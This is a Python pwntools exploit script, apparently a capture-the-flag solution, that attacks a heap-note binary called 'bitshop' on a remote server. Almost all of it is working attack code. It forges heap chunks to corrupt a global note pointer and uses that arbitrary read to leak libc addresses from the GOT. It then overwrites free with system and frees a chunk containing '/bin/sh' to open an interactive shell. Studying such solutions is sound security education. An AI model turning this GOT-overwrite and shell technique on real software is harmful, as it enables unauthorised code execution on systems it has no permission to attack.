from pwn import *

context(log_level='debug')
num_note_addr = 0x602100
elf = ELF('./bitshop')
got_free = elf.got['free']
got_alarm = elf.got['alarm']
name_addr = 0x6020E0
may_system_offset = [-0x2a380,-0x297f0]

# p = process('./bitshop')

def add(length,name,content):
	p.recvuntil('choice $')
	p.sendline('1')
	p.recvuntil('length:')
	p.sendline(str(length))
	p.recvuntil('comment:')
	p.sendline(content)
	p.recvuntil('name:')
	p.sendline(name)
	p.recvuntil('cart!')

def editnote(note):
	p.recvuntil('choice $')
	p.sendline('4')
	p.recvuntil('shopping note :')
	p.sendline(note)
	p.recvuntil('recorded!')
def dele(index):
	p.recvuntil('choice $')
	p.sendline('3')
	p.recvuntil('id :')
	p.sendline(str(index))
	p.recvuntil('removed!')
def show(addr):
	### covert
	payload1 = p32(0)+p64(1)+p64(1)+p64(num_note_addr-0x10)+'A'*(0x40-0x8)+p64(0x602140+0x8)+p64(addr)+p64(1)+'a'
	editnote(payload1)
	p.recvuntil('choice $')
	p.sendline('5')
	p.recvuntil('Comment : ')
	data = p.recvuntil('\n')
	### recovery
	payload2 = 0xc * 'A' +p64(num_note_addr-0x18)
	editnote(payload2)
	return data[:-1]
def editcontent(index,length,content):
	p.recvuntil('choice $')
	p.sendline('2')
	p.recvuntil('id :')
	p.sendline(str(index))
	p.recvuntil('length :')
	p.sendline(str(length))
	p.recvuntil('comment :')
	p.sendline(content)
	p.recvuntil('edited!')
def leak(addr):
	data = show(addr)
	print "%#x => %s" % (addr, (data or '').encode('hex'))
	return data
def dele2(index):
	p.recvuntil('choice $')
	p.sendline('3')
	p.recvuntil('id :')
	p.sendline(str(index))
for sys_offset in may_system_offset:
	p = remote('101.200.187.112',9002)
	p.recvuntil('name:')
	p.sendline('WinterSun')
	add(0x80,'aaa','aaaa')
	add(0x80,'aaa','aaaa')
	add(0x80,'aaa','aaaa')
	add(0x80,'aaa','aaaa')
	add(0x80,'aaa','aaaa')
	add(0x80,'aaa','aaaa')
	add(0x80,'lalala','/bin/sh\0')#6
	payload  = p32(0x0)+p64(0x61)+p64(num_note_addr-0x18)+p64(num_note_addr-0x10)+'A'*(0x60-4*8)
	payload += p64(0x60)+p64(0x90)
	# payload = 'A'*0x50
	print len(payload)
	editnote(payload)
	dele(0)
	# d = DynELF(leak,elf=ELF('./bitshop'))
	# system_addr = d.lookup('system','libc')
	# print 'system_addr=' + hex(system_addr)
	free_libc = u64(leak(got_free).ljust(8,'\x00'))
	alarm_libc = u64(leak(got_alarm).ljust(8,'\x00'))
	puts_libc = u64(leak(elf.got['puts']).ljust(8,'\x00'))
	print 'free_libc = '+ hex(free_libc)
	print 'alarm_libc = '+ hex(alarm_libc)
	print 'puts_libc = '+ hex(puts_libc)
	# system_addr = puts_libc - 0x00070c70 + 0x000468f0
	system_addr = puts_libc+sys_offset
	print 'system_addr = '+hex(system_addr)

	## change free to system
	payload3 =  p32(0)+p64(1)+p64(1)+p64(got_free-4)
	payload4 = p64(system_addr)
	# gdb.attach(pidof(p)[0])
	editnote(payload3)
	editnote(payload4)

	## get shell

	dele2(6)
	p.interactive()